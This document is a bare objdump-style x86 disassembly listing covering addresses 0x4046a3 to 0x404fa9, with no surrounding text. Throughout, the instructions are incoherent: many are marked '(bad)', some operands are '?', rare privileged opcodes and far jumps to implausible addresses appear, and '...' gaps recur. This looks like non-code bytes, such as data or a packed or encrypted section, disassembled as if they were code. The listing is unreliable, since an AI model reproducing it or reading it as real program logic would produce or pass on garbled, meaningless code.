  4046a3:	ret    0x924f
  4046a6:	loop   0x404673
  4046a8:	int    0xa1
  4046aa:	xor    DWORD PTR [edx],eax
  4046ac:	cdq    
  4046ad:	aam    0x54
  4046af:	inc    edx
  4046b0:	mov    WORD PTR [ebp-0x29e6b80c],ss
  4046b6:	loope  0x4046ba
  4046b8:	popa   
  4046b9:	int3   
  4046ba:	ins    BYTE PTR es:[edi],dx
  4046bb:	inc    edx
  4046bc:	mov    WORD PTR [ebx],cs
  4046be:	lods   al,BYTE PTR ds:[esi]
  4046bf:	scas   eax,DWORD PTR es:[edi]
  4046c0:	lea    edx,[ecx-0x6bb28143]
  4046c6:	jp     0x40470e
  4046c8:	add    al,0x96
  4046ca:	in     al,0x53
  4046cc:	or     esi,edx
  4046ce:	loope  0x40468a
  4046d0:	iret   
  4046d1:	sar    DWORD PTR [edx-0x61],0xeb
  4046d5:	mov    eax,ds:0x47aa9bf9
  4046da:	loope  0x4046df
	...
  4046f0:	nop    esi
  4046f3:	xor    eax,0xfc5417aa
  4046f8:	mov    bl,0x77
  4046fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046fb:	add    al,0x8c
  4046fd:	mov    esp,DWORD PTR [ecx-0x3a236ccf]
  404703:	stos   DWORD PTR es:[edi],eax
  404704:	mov    bl,0x17
  404706:	ficom  DWORD PTR [edi]
  404708:	pop    ss
  404709:	aad    0xe5
  40470b:	xchg   ebx,eax
  40470c:	xchg   edi,eax
  40470d:	push   esp
  40470e:	xor    al,0x3
  404710:	aam    0x17
  404712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404713:	stos   DWORD PTR es:[edi],eax
  404714:	xchg   ebx,eax
  404715:	sub    esp,ebp
  404717:	jle    0x4046a5
  404719:	or     esp,ecx
  40471b:	mov    esp,0x50e1904e
  404720:	pop    es
  404721:	sub    BYTE PTR [edx-0x40],ah
  404724:	jl     0x4046e9
  404726:	mov    dl,0xce
  404728:	test   BYTE PTR [esi-0x6d09fae5],0x8
  40472f:	xor    edi,0xae90845
  404735:	sbb    al,0xf7
  404737:	fcom   QWORD PTR [ecx+0x50726a2b]
  40473d:	stos   BYTE PTR es:[edi],al
  40473e:	sbb    BYTE PTR [ebp+ecx*8+0x24],ah
  404742:	pop    eax
  404743:	inc    ecx
  404744:	ins    DWORD PTR es:[edi],dx
  404745:	xor    dh,bh
  404747:	inc    esi
  404748:	outs   dx,BYTE PTR ds:[esi]
  404749:	dec    edi
  40474a:	dec    ebp
  40474b:	cmp    DWORD PTR [edx+0x7fa48394],ecx
  404751:	push   cs
  404752:	(bad)
	...
  404765:	add    BYTE PTR [eax],al
  404767:	add    BYTE PTR [eax-0x4a950537],dl
  40476d:	mov    BYTE PTR [eax],cl
  40476f:	xchg   ebp,eax
  404770:	mov    WORD PTR [ebx],cs
  404772:	dec    ebp
  404773:	in     eax,0x1a
  404775:	ja     0x404702
  404777:	mov    ebx,?
  404779:	push   ss
  40477a:	jl     0x40476f
  40477c:	adc    bl,BYTE PTR [ecx-0x6f631700]
  404782:	jecxz  0x404750
  404784:	cli    
  404785:	xchg   bh,dh
  404787:	je     0x404760
  404789:	cs fs out 0xf6,al
  40478d:	push   ss
  40478e:	mov    esp,ecx
  404790:	mul    BYTE PTR [eax+0xd8bc20a]
  404796:	dec    ebp
  404797:	aad    0x91
  404799:	test   BYTE PTR [ebp+0x5bc3e02c],al
  40479f:	rcl    DWORD PTR [eax],1
  4047a1:	inc    esi
  4047a2:	or     cl,ch
  4047a4:	adc    bl,BYTE PTR [edi+esi*8]
  4047a7:	xor    al,0x90
  4047a9:	shl    eax,0x7d
  4047ac:	inc    ebp
  4047ad:	xchg   ebp,eax
  4047ae:	or     dl,bl
  4047b0:	push   edx
  4047b1:	or     cl,bl
  4047b3:	xor    bh,BYTE PTR [ecx]
  4047b5:	push   ebx
  4047b6:	add    al,0xe9
  4047b8:	fmul   QWORD PTR [ecx]
  4047ba:	in     al,0x0
  4047bc:	xchg   cl,al
  4047be:	mov    edi,DWORD PTR [ebp+0x45]
  4047c1:	xchg   edx,eax
  4047c2:	jge    0x4047cf
  4047c4:	popf   
  4047c5:	nop
  4047c6:	or     BYTE PTR [eax],al
  4047c8:	gs retf 
  4047ca:	push   ebx
  4047cb:	leave  
	...
  4047e0:	ja     0x4047ff
  4047e2:	test   DWORD PTR [edx+0xb21e60],0x6a089225
  4047ec:	and    eax,0xa107ceb
  4047f1:	jmp    0x40486f
  4047f3:	or     BYTE PTR [ebp+0x2500c674],bh
  4047f9:	adc    eax,0x8f397ec8
  4047fe:	lock sub DWORD PTR [eax],edi
  404801:	or     BYTE PTR [ebx+0x7d92057d],0x7
  404808:	pop    esi
  404809:	nop
  40480a:	or     BYTE PTR [eax],al
  40480c:	in     eax,0xf6
  40480e:	or     ebx,ebp
  404810:	scas   eax,DWORD PTR es:[edi]
  404811:	xchg   esi,eax
  404812:	retf   
  404813:	pop    edi
  404814:	cs fxch st(1)
  404817:	or     al,0xe5
  404819:	les    eax,FWORD PTR [ebx-0x42a9b14]
  40481f:	(bad)  
  404820:	mov    dl,0xeb
  404822:	div    BYTE PTR [ebp-0x4f]
  404825:	pushf  
  404826:	(bad)  
  404827:	hlt    
  404828:	jecxz  0x404815
  40482a:	test   bh,0x28
  40482d:	call   0x91134827
  404832:	or     BYTE PTR [eax],al
  404834:	mov    ch,0x54
  404836:	(bad)  
  404837:	cld    
  404838:	jecxz  0x404825
  40483a:	test   BYTE PTR [ecx],0xa5
  40483d:	xchg   ecx,eax
  40483e:	or     BYTE PTR [ebp-0x86f08],cl
	...
  404858:	and    ch,bl
  40485a:	jl     0x404864
  40485c:	mov    WORD PTR [esi-0xf672f4],gs
  404862:	mov    eax,ds:0x167b6bff
  404867:	add    dh,dh
  404869:	sub    edi,DWORD PTR [esi-0x7b]
  40486c:	pop    eax
  40486d:	popf   
  40486e:	mov    eax,ds:0xc91bcff
  404873:	call   0x4ca605
  404878:	btr    DWORD PTR [ecx-0x34cd6f8c],esp
  40487f:	jne    0x404809
  404881:	jp     0x40484f
  404883:	jmp    0x404816
  404885:	adc    ecx,DWORD PTR [ebx]
  404887:	add    BYTE PTR [ebx+ebp*1+0x2b84c2b2],cl
  40488e:	inc    esi
  40488f:	mov    esp,DWORD PTR [eax]
  404891:	stos   BYTE PTR es:[edi],al
  404892:	enter  0x5ffc,0x42
  404896:	les    ebp,FWORD PTR [edx+0x66]
  404899:	jbe    0x4048c2
  40489b:	or     ah,ah
  40489d:	scas   eax,DWORD PTR es:[edi]
  40489e:	mov    eax,ds:0xcb31f3ff
  4048a3:	je     0x4048e5
  4048a5:	add    DWORD PTR [ebp-0x1],eax
  4048a8:	pop    ecx
  4048a9:	and    edx,DWORD PTR [ebx-0x5fe22481]
  4048af:	or     ecx,esp
  4048b1:	lahf   
  4048b2:	or     eax,0xcc150eb
  4048b7:	push   0xffffff8d
  4048b9:	test   al,0x36
  4048bb:	inc    DWORD PTR [eax]
	...
  4048cd:	add    BYTE PTR [eax],al
  4048cf:	add    BYTE PTR [esi+edi*1+0x26],bl
  4048d3:	or     BYTE PTR [eax+eax*1-0x5773ff42],ah
  4048da:	retf   
  4048db:	jle    0x404939
  4048dd:	mov    ds:0x68541436,al
  4048e2:	mov    eax,ds:0xa9a8e75
  4048e7:	mov    esp,ecx
  4048e9:	xchg   esp,eax
  4048ea:	std    
  4048eb:	jl     0x40488b
  4048ed:	jle    0x4048d0
  4048ef:	sbb    eax,0xa924218d
  4048f4:	fcom   QWORD PTR [ebx]
  4048f6:	sbb    al,0xf8
  4048f8:	push   0x67
  4048fa:	shr    DWORD PTR [eax+0x5c99a0d9],1
  404900:	xor    al,0x14
  404902:	jle    0x4048f0
  404904:	enter  0xf3a4,0x5
  404908:	aaa    
  404909:	cdq    
  40490a:	fs int3 
  40490c:	mov    eax,0xd7c47a40
  404911:	frstor [edx]
  404913:	jl     0xdd7b382
  404919:	fchs   
  40491b:	stos   DWORD PTR es:[edi],eax
  40491c:	and    edx,DWORD PTR [edx+edx*4]
  40491f:	fdiv   QWORD PTR [esi]
  404921:	jg     0x4048be
  404923:	test   al,0x99
  404925:	pushf  
  404926:	dec    ecx
  404927:	or     ecx,DWORD PTR [ebx]
  404929:	adc    al,0x2e
  40492b:	cld    
  40492c:	inc    ebx
  40492d:	mov    DWORD PTR [esi-0x6beca9e3],ecx
  404933:	sti    
	...
  404948:	jmp    0x4048e8
  40494a:	push   es
  40494b:	test   al,0xeb
  40494d:	lahf   
  40494e:	and    DWORD PTR [esi],ebp
  404950:	mov    ?,edi
  404952:	popf   
  404953:	sbb    BYTE PTR [ecx-0x5c],0xe1
  404957:	sti    
  404958:	rcl    DWORD PTR [ebx],cl
  40495a:	jg     0x40495c
  40495c:	add    al,0x95
  40495e:	stc    
  40495f:	add    ecx,DWORD PTR [edi+edi*8-0x5bae851f]
  404966:	dec    ebx
  404967:	add    al,0x5c
  404969:	and    DWORD PTR [esp+eax*1-0x5c],ebp
  40496d:	adc    ecx,esi
  40496f:	push   esp
  404970:	mov    ds:0x5c9bf989,eax
  404975:	loope  0x40497e
  404977:	jmp    0x3108630b
  40497c:	mov    ?,edi
  40497e:	and    ebx,DWORD PTR [edi+ecx*4]
  404981:	push   edi
  404982:	jecxz  0x40494a
  404984:	fistp  WORD PTR [edi]
  404986:	pop    ebp
  404987:	in     eax,0xf6
  404989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40498a:	(bad)  
  40498b:	jmp    0xe9cd6b4f
  404990:	aaa    
  404991:	adc    esi,edi
  404993:	sbb    DWORD PTR [ebx],esi
  404995:	mov    DWORD PTR [esi+esi*2],eax
  404998:	mov    esi,0xccc050a4
  40499d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40499e:	mov    esp,esp
  4049a0:	lahf   
  4049a1:	xchg   esp,eax
  4049a2:	jge    0x40498e
  4049a4:	into   
  4049a5:	dec    DWORD PTR [ebx]
  4049a7:	ins    BYTE PTR es:[edi],dx
  4049a8:	inc    edi
  4049a9:	mov    BYTE PTR [ecx+0x62],dl
	...
  4049bf:	add    BYTE PTR [edi+0x6f],cl
  4049c2:	shr    DWORD PTR [ebx],0x24
  4049c5:	adc    ebx,DWORD PTR [edx+esi*2-0xc]
  4049c9:	push   ss
  4049ca:	int3   
  4049cb:	xor    ebx,eax
  4049cd:	(bad)  
  4049ce:	test   ebx,0x9cf76b8f
  4049d4:	pop    es
  4049d5:	sti    
  4049d6:	retf   
  4049d7:	xor    edx,DWORD PTR ss:[ebx]
  4049da:	iret   
  4049db:	lods   al,BYTE PTR ds:[esi]
  4049dc:	sub    edx,DWORD PTR [eax+ecx*1+0x5d1f8fe9]
  4049e3:	icebp  
  4049e4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e6:	test   DWORD PTR [edi+eiz*1+0x54ed6264],esp
  4049ed:	pop    ecx
  4049ee:	hlt    
  4049ef:	cdq    
  4049f0:	repnz mov BYTE PTR [eax],al
  4049f3:	out    0x5d,al
  4049f5:	mov    al,ds:0x1064684f
  4049fa:	add    eax,0x7c9cb4e3
  4049ff:	jecxz  0x404a0f
  404a01:	xchg   ecx,eax
  404a02:	lock add BYTE PTR [ebp-0x1acc3e3d],dh
  404a09:	sub    eax,0x15e28b0d
  404a0e:	enter  0x9a03,0x4f
  404a12:	retf   0x7504
  404a15:	gs sub esp,0xffffffe6
  404a19:	push   ecx
  404a1a:	cld    
  404a1b:	push   ebx
  404a1c:	mov    dl,0xb0
  404a1e:	nop
  404a1f:	cmp    dh,BYTE PTR [ebp-0x6a]
  404a22:	loopne 0x404a10
	...
  404a38:	sub    bh,BYTE PTR [ebx]
  404a3a:	test   DWORD PTR [ecx+0x45853cb0],0x29e065d1
  404a44:	and    bh,BYTE PTR [ebx]
  404a46:	div    DWORD PTR [ebx]
  404a48:	into   
  404a49:	stos   DWORD PTR es:[edi],eax
  404a4a:	push   ss
  404a4b:	push   0x3f
  404a4d:	scas   al,BYTE PTR es:[edi]
  404a4e:	or     dl,bh
  404a50:	and    eax,0xc175f796
  404a55:	cmp    bh,BYTE PTR [ebp+0x8]
  404a58:	mov    ebp,0x5afff691
  404a5d:	adc    al,0xc8
  404a5f:	pop    fs
  404a61:	add    eax,0x3af50008
  404a66:	jge    0x404a5c
  404a68:	popf   
  404a69:	mov    edx,0xfc9affdf
  404a6e:	idiv   cl
  404a70:	in     eax,0x95
  404a72:	jle    0x404a79
  404a74:	mov    WORD PTR [ecx+0x3af50009],ds
  404a7a:	jge    0x404a70
  404a7c:	jge    0x404ad9
  404a7e:	idiv   edi
  404a80:	ficom  DWORD PTR [ecx+0x3a7174c8]
  404a86:	jge    0x404a7c
  404a88:	fisttp QWORD PTR [ecx+edx*8+0x5d8bdaff]
  404a8f:	hlt    
  404a90:	mov    WORD PTR [esi+0x1a],?
  404a93:	push   0xffffff8c
  404a95:	push   ebx
  404a96:	clc    
  404a97:	and    BYTE PTR [ebx+edi*8+0x75ab],cl
	...
  404aae:	add    BYTE PTR [eax],al
  404ab0:	cwde   
  404ab1:	push   edx
  404ab2:	daa    
  404ab3:	hlt    
  404ab4:	xchg   ebx,eax
  404ab5:	lods   eax,DWORD PTR ds:[esi]
  404ab6:	lock (bad) 
  404ab8:	rol    DWORD PTR [ebx+0xc],1
  404abb:	add    BYTE PTR [ebx+edi*8-0x4334c2ee],cl
  404ac2:	or     al,0xff
  404ac4:	stc    
  404ac5:	daa    
  404ac6:	xchg   esp,eax
  404ac7:	into   
  404ac8:	push   edi
  404ac9:	sti    
  404aca:	or     dl,BYTE PTR [ebx-0x69]
  404acd:	cmp    edi,DWORD PTR [eax]
  404acf:	ss pop es
  404ad1:	adc    edx,DWORD PTR [edi*1-0x17f3433d]
  404ad8:	stos   DWORD PTR es:[edi],eax
  404ad9:	xor    eax,0x738f000c
  404ade:	inc    ebp
  404adf:	inc    edi
  404ae0:	pop    es
  404ae1:	shl    BYTE PTR [ebx-0x6c],cl
  404ae4:	popf   
  404ae5:	sti    
  404ae6:	or     dh,BYTE PTR [eax-0x47a19267]
  404aec:	clc    
  404aed:	jmp    0x404af9
  404aef:	add    BYTE PTR [edi-0x44],ah
  404af2:	mov    dh,0x47
  404af4:	adc    edi,ebx
  404af6:	inc    ebx
  404af7:	push   ebx
  404af8:	hlt    
  404af9:	adc    dh,BYTE PTR [ecx+0x37848c00]
  404aff:	clc    
  404b00:	pop    ebx
  404b01:	mov    ecx,0x4a81ff35
  404b06:	inc    eax
  404b07:	push   0x4a3259
  404b0c:	jecxz  0x404a9d
  404b0e:	scas   eax,DWORD PTR es:[edi]
  404b0f:	call   0x4d1125
	...
  404b28:	aas    
  404b29:	test   dl,0x74
  404b2c:	push   eax
  404b2d:	jbe    0x404ad3
  404b2f:	push   0x433e9451
  404b34:	mov    esp,?
  404b36:	mov    esi,0xe2948cba
  404b3b:	stos   DWORD PTR es:[edi],eax
  404b3c:	inc    ebx
  404b3d:	pop    ecx
  404b3e:	push   0xffffffc4
  404b40:	in     eax,0x27
  404b42:	rol    BYTE PTR [ebx],1
  404b44:	mov    WORD PTR [esp+eiz*8-0x4f],es
  404b48:	loop   0x404b95
  404b4a:	push   ebp
  404b4b:	adc    cl,BYTE PTR [esp+edx*4+0x584ac30a]
  404b52:	scas   al,BYTE PTR es:[edi]
  404b53:	add    esp,ebx
  404b55:	arpl   WORD PTR [ecx-0x61ef9da0],bx
  404b5b:	js     0x404b1e
  404b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b5e:	jmp    0x6701:0x7898d8d1
  404b65:	xchg   edi,eax
  404b66:	adc    DWORD PTR [edx+eax*2-0x145b8211],ebx
  404b6d:	(bad)  
  404b6e:	sub    eax,0xca6f91a5
  404b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b74:	ror    DWORD PTR [eax],0x59
  404b77:	fist   DWORD PTR [eax+edx*1+0x5e]
  404b7b:	sub    BYTE PTR [ecx-0x74d31ef4],0xd7
  404b82:	mov    ds:0x81948cab,eax
  404b87:	add    edx,DWORD PTR [ebx]
  404b89:	mov    bh,BYTE PTR [ecx]
  404b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  404ba0:	or     DWORD PTR [eax],0xfc942e26
  404ba6:	add    eax,0x160ffba6
  404bab:	cs clc 
  404bad:	cld    
  404bae:	cwde   
  404baf:	int    0xeb
  404bb1:	pminsw mm0,mm3
  404bb4:	pop    ecx
  404bb5:	xchg   edx,eax
  404bb6:	sbb    cl,BYTE PTR [eax]
  404bb8:	xchg   esp,edx
  404bba:	jl     0x404bc8
  404bbc:	pop    es
  404bbd:	push   0x8
  404bbf:	std    
  404bc0:	inc    ebx
  404bc1:	mov    ds:0xebb74f7,al
  404bc6:	jge    0x404ba5
  404bc8:	out    dx,eax
  404bc9:	bound  edi,QWORD PTR [esp+eiz*2]
  404bcc:	enter  0xd8c,0x92
  404bd0:	xchg   ecx,eax
  404bd1:	xchg   esp,eax
  404bd2:	or     cl,ch
  404bd4:	adc    ch,BYTE PTR [edx-0x4]
  404bd7:	jb     0x404b7b
  404bd9:	push   cs
  404bda:	jge    0x404b91
  404bdc:	out    dx,eax
  404bdd:	bound  eax,QWORD PTR [eax]
  404bdf:	mov    dh,0xa5
  404be1:	adc    al,ah
  404be3:	inc    ecx
  404be4:	dec    esi
  404be5:	maskmovq mm6,(bad)
  404be6:	div    DWORD PTR [edx+0x53]
  404be9:	outs   dx,DWORD PTR ds:[esi]
  404bea:	push   ebx
  404beb:	mov    al,0x4a
  404bed:	mov    al,ds:0x1b3c08
  404bf2:	mov    esp,DWORD PTR [ebp-0x2da49848]
  404bf8:	sbb    bh,BYTE PTR [eax+ecx*1-0x37]
  404bfc:	(bad)  
  404bfd:	xchg   esp,eax
  404bfe:	loopne 0x404c0a
  404c00:	dec    esi
  404c01:	maskmovq mm4,(bad)
  404c02:	mul    DWORD PTR [eax+0x0]
	...
  404c15:	add    BYTE PTR [eax],al
  404c17:	add    ch,dl
  404c19:	adc    BYTE PTR [eax-0x17],ah
  404c1c:	das    
  404c1d:	maskmovq mm2,(bad)
  404c1e:	not    DWORD PTR [ecx+0x76]
  404c21:	out    dx,al
  404c22:	not    BYTE PTR [esi+0x19]
  404c25:	pop    ecx
  404c26:	mov    esp,0x8b48fc1
  404c2b:	jmp    0x3f16a917
  404c30:	out    dx,eax
  404c31:	sbb    al,0x4d
  404c33:	jne    0x404c52
  404c35:	xchg   ecx,eax
  404c36:	enter  0xec70,0xe
  404c3a:	imul   ecx
  404c3c:	loop   0x404c8c
  404c3e:	sti    
  404c3f:	push   ebx
  404c40:	(bad)  
  404c41:	pop    eax
  404c42:	enter  0x8fd5,0x94
  404c46:	or     BYTE PTR [esi],ah
  404c48:	push   ebp
  404c49:	call   0x93324d44
  404c4e:	or     bh,al
  404c50:	sub    BYTE PTR [ebx],ah
  404c52:	neg    DWORD PTR [edi]
  404c54:	mov    ch,0x92
  404c56:	div    DWORD PTR [ebp-0x4f]
  404c59:	and    DWORD PTR [ebp-0x30],ecx
  404c5c:	mov    dl,0xab
  404c5e:	mov    esp,0x8544688f
  404c63:	inc    ebp
  404c64:	cmc    
  404c65:	ret    0x60
  404c68:	mov    ch,0x92
  404c6a:	mov    BYTE PTR [edx-0x5b],ch
  404c6d:	xor    DWORD PTR [ebp+0x8],edi
  404c70:	mov    ebp,0x7500c2c9
  404c75:	lahf   
  404c76:	enter  0x6b74,0x17
  404c7a:	jne    0x404c4c
	...
  404c90:	lods   eax,DWORD PTR gs:[esi]
  404c92:	or     eax,0x89223e9
  404c97:	add    BYTE PTR [edx],bh
  404c99:	pop    ebp
  404c9a:	mov    eax,0x89272ff
  404c9f:	lea    ebp,[eax+0x58ff5868]
  404ca5:	outs   dx,BYTE PTR ds:[esi]
  404ca6:	pusha  
  404ca7:	add    BYTE PTR ds:0x688d8892,dh
  404cad:	fcom   DWORD PTR [edi-0x18]
  404cb0:	xchg   edi,eax
  404cb1:	fiadd  WORD PTR [edi]
  404cb3:	add    BYTE PTR [esi],bh
  404cb5:	sar    BYTE PTR [ebp+eax*1-0x34],cl
  404cb9:	or     BYTE PTR [eax],0x0
  404cbc:	xor    eax,0x6bb44d1f
  404cc1:	xchg   ecx,eax
  404cc2:	or     BYTE PTR [ebp+0x3cb0d1d0],cl
  404cc8:	cmc    
  404cc9:	xchg   ecx,eax
  404cca:	or     BYTE PTR [ebx],dh
  404ccc:	mov    ch,0x26
  404cce:	mov    ds:0x33d228c7,al
  404cd3:	add    ch,ah
  404cd5:	xchg   ecx,eax
  404cd6:	div    DWORD PTR [ebp-0x74]
  404cd9:	outs   dx,DWORD PTR ds:[esi]
  404cda:	call   0xdbd4:0x40b6f045
  404ce1:	test   BYTE PTR [edx],0x0
  404ce4:	retf   
  404ce5:	cmp    BYTE PTR [ebx+0xafbabff],bl
  404ceb:	lea    ecx,[ecx-0x45]
  404cee:	cmp    ebp,DWORD PTR [edx-0x74]
  404cf1:	popa   
  404cf2:	or     al,0xff
	...
  404d08:	cmp    DWORD PTR [edi],ebp
  404d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d0b:	out    0xd5,al
  404d0d:	sti    
  404d0e:	or     cl,BYTE PTR [ebx]
  404d10:	int3   
  404d11:	add    al,BYTE PTR [bp+di+0x2b19]
  404d16:	or     al,0x75
  404d18:	mov    fs,edx
  404d1a:	sub    edi,edi
  404d1c:	add    DWORD PTR [eax-0x57],ecx
  404d1f:	jne    0x404d59
  404d21:	push   ebx
  404d22:	xor    DWORD PTR [edi-0x33],ecx
  404d25:	sti    
  404d26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d27:	jne    0x404d59
  404d29:	and    edx,DWORD PTR [ebx]
  404d2b:	leave  
  404d2c:	mov    ebx,?
  404d2e:	mov    eax,esp
  404d30:	jl     0x404d20
  404d32:	dec    edi
  404d33:	inc    ebp
  404d34:	xor    al,0xab
  404d36:	add    BYTE PTR es:[ebx+0x8],dl
  404d3a:	xchg   edi,eax
  404d3b:	call   0xffe9ce7a
  404d40:	xchg   edi,eax
  404d41:	cmp    ebx,DWORD PTR [edi]
  404d43:	add    ah,BYTE PTR [edi]
  404d45:	mov    al,0x83
  404d47:	inc    ebp
  404d48:	hlt    
  404d49:	ins    DWORD PTR es:[edi],dx
  404d4a:	pop    ds
  404d4b:	mov    esp,0xc30934
  404d50:	mov    WORD PTR [ebx-0x58],cs
  404d53:	jne    0x404d2d
  404d55:	push   ebp
  404d56:	pop    ds
  404d57:	mov    eax,0xff942824
  404d5c:	or     esi,edx
  404d5e:	retf   0x8e75
  404d61:	push   edx
  404d62:	cld    
  404d63:	inc    BYTE PTR [ecx+0x79a0f194]
  404d69:	mov    al,ds:0x1716
	...
  404d7e:	add    BYTE PTR [eax],al
  404d80:	and    al,0xfc
  404d82:	rcr    DWORD PTR [esi-0x4395f31d],cl
  404d88:	fild   DWORD PTR [esi-0x253153b7]
  404d8e:	loopne 0x404d93
  404d90:	retf   
  404d91:	xchg   BYTE PTR ds:0xe5ef96ac,dh
  404d97:	mov    al,ds:0xabad86bb
  404d9c:	mov    gs,edi
  404d9e:	aad    0xa0
  404da0:	stos   DWORD PTR es:[edi],eax
  404da1:	xchg   ch,bl
  404da3:	stos   DWORD PTR es:[edi],eax
  404da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404da5:	out    dx,eax
  404da6:	lds    esp,FWORD PTR [eax+0x4129d107]
  404dac:	vpmulhuw xmm0,xmm5,XMMWORD PTR [ebx]
  404db0:	loope  0x404dd1
  404db2:	int    0x84
  404db4:	dec    eax
  404db5:	or     DWORD PTR [edx+0x46],ebp
  404db8:	mov    BYTE PTR [edi-0x2c75e85f],bl
  404dbe:	loopne 0x404dc3
  404dc0:	mov    WORD PTR [ecx+eiz*8-0x1ef73638],ss
  404dc7:	add    ecx,DWORD PTR [esp+edx*4+0x6550467c]
  404dce:	jbe    0x404de6
  404dd0:	cwde   
  404dd1:	or     esi,esp
  404dd3:	or     esi,DWORD PTR [esi+edi*2]
  404dd6:	addr16 mov al,ds:0x183b
  404dda:	in     al,dx
  404ddb:	lahf   
  404ddc:	mov    WORD PTR [eax+0xb8c2dfe],es
  404de2:	aam    0xf
	...
  404df8:	and    eax,DWORD PTR [edx+0xac2ab45]
  404dfe:	dec    esi
  404dff:	mov    al,ds:0x9fbc0bbc
  404e04:	hlt    
  404e05:	cmp    DWORD PTR [eax],ecx
  404e07:	adc    eax,0x20500c2c
  404e0c:	rcr    DWORD PTR [eax+ecx*1-0x7506ff44],1
  404e13:	and    eax,0xaccf730b
  404e18:	add    edx,DWORD PTR [esi+0x51c48708]
  404e1e:	mul    bh
  404e20:	(bad)  
  404e21:	jle    0x404e2f
  404e23:	ins    BYTE PTR es:[edi],dx
  404e24:	push   edx
  404e25:	or     BYTE PTR [eax-0x7f],bl
  404e28:	setne  BYTE PTR [eax]
  404e2b:	jmp    0xea375997
  404e30:	(bad)  
  404e31:	or     edi,DWORD PTR [ebp-0xf]
  404e34:	not    DWORD PTR [edx-0x3f]
  404e37:	jmp    0xe60a2bcb
  404e3c:	(bad)  
  404e3d:	popa   
  404e3e:	adc    ebp,0xf
  404e41:	shl    DWORD PTR [ebx+0x4cd3bf16],1
  404e47:	test   DWORD PTR [eax+0x5ee90894],ecx
  404e4d:	out    dx,al
  404e4e:	pop    edi
  404e4f:	jmp    0x923759d3
  404e54:	sub    al,0xf6
  404e57:	xchg   esi,eax
  404e58:	adc    DWORD PTR [ecx-0x38],edx
  404e5b:	add    DWORD PTR [eax],eax
	...
  404e6d:	add    BYTE PTR [eax],al
  404e6f:	add    BYTE PTR [eax+0x27e908a4],dl
  404e75:	jge    0x404e4b
  404e77:	jle    0x404ea4
  404e79:	sbb    eax,0x9470314d
  404e7e:	sbb    cl,ch
  404e80:	(bad)  
  404e81:	cld    
  404e82:	push   ebx
  404e83:	inc    ebp
  404e84:	adc    ecx,DWORD PTR [ebx]
  404e86:	and    DWORD PTR [ebx+ecx*8-0x3ed28ae7],0x8fe908c8
  404e91:	(bad)  
  404e92:	enter  0x5600,0x7e
  404e96:	iret   
  404e97:	inc    ebp
  404e98:	mov    cl,0xf4
  404e9a:	idiv   bh
  404e9c:	cmc    
  404e9d:	sub    DWORD PTR [ebp-0x40],edi
  404ea0:	pop    edx
  404ea1:	pop    ebp
  404ea2:	fdiv   st(7),st
  404ea4:	adc    BYTE PTR [edi-0x79],ch
  404ea7:	inc    ebp
  404ea8:	test   ebx,edx
  404eaa:	dec    esp
  404eab:	fdivr  DWORD PTR [edx-0x65]
  404eae:	or     BYTE PTR [eax],al
  404eb0:	mov    dl,0x5d
  404eb2:	cld    
  404eb3:	(bad)  
  404eb4:	ficom  DWORD PTR [esi-0x2d0f72f8]
  404eba:	push   edi
  404ebb:	push   0x800896b5
  404ec0:	seta   bh
  404ec3:	jne    0x404e82
  404ec5:	ds (bad) 
  404ec7:	enter  0x96b5,0x3
  404ecb:	rol    BYTE PTR [ecx-0x6e],0x8b
  404ecf:	jge    0x404eb2
  404ed1:	xchg   esi,eax
  404ed2:	jge    0x404ed9
	...
  404ee8:	mov    esp,0x75000833
  404eed:	ror    DWORD PTR [eax+esi*4+0x3a],cl
  404ef1:	fwait
  404ef2:	or     BYTE PTR [eax],al
  404ef4:	fcomp  DWORD PTR [eax+edi*4+0x50]
  404ef8:	sub    ch,BYTE PTR [ebp-0x698a974c]
  404efe:	or     BYTE PTR [eax+0x50cc5ce8],al
  404f04:	or     eax,0x6500c05d
  404f09:	lahf   
  404f0a:	enter  0x3075,0x39
  404f0e:	rol    BYTE PTR [eax],1
  404f10:	xor    eax,0x7d458396
  404f15:	iret   
  404f16:	pop    es
  404f17:	add    BYTE PTR [eax-0x7646334c],bh
  404f1d:	nop
  404f1e:	or     BYTE PTR [eax],al
  404f20:	mov    WORD PTR [esi-0x4d190c34],gs
  404f26:	inc    eax
  404f27:	les    edx,FWORD PTR [eax-0x5]
  404f2a:	or     al,BYTE PTR [eax]
  404f2c:	or     eax,DWORD PTR [ecx+0x53]
  404f2f:	(bad)
  404f33:	inc    ebp
  404f34:	aam    0xba
  404f36:	push   es
  404f37:	add    BYTE PTR [edx+edi*4-0x5140bc0],cl
  404f3e:	or     al,BYTE PTR [eax]
  404f40:	adc    DWORD PTR [ecx],edi
  404f42:	iret   
  404f43:	push   eax
  404f44:	data16 sti 
  404f46:	and    BYTE PTR [eax],al
  404f48:	ror    DWORD PTR [eax+0xe857],cl
	...
  404f5e:	add    BYTE PTR [eax],al
  404f60:	lds    esi,FWORD PTR [edx-0x4468fff5]
  404f66:	pop    ds
  404f67:	push   es
  404f68:	vmwrite edi,DWORD PTR [edi-0x5e07c700]
  404f6f:	mov    WORD PTR [ebx+edi*8+0xb19ff0a],cs
  404f76:	xchg   esp,eax
  404f77:	jne    0x404f45
  404f79:	ficomp DWORD PTR [esi]
  404f7b:	mov    eax,0x4146c424
  404f80:	mov    WORD PTR [edx+0x1f],cs
  404f83:	mov    esp,0xcd7974
  404f88:	mov    WORD PTR [esi-0x40],?
  404f8b:	adc    al,0x83
  404f8d:	push   0x4f
  404f8f:	fdivr  QWORD PTR [ebp+eiz*4+0x3bd9ff0c]
  404f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f97:	sti    
  404f98:	push   esp
  404f99:	sbb    dl,BYTE PTR [ebp+0x9084c0b]
  404f9f:	jmp    0x404f8b
  404fa1:	test   BYTE PTR [edi-0x4c],cl
  404fa4:	inc    ebx
  404fa5:	or     BYTE PTR [edi-0x18],bl
  404fa8:	in     eax,dx
  404fa9:	js     0x404f40
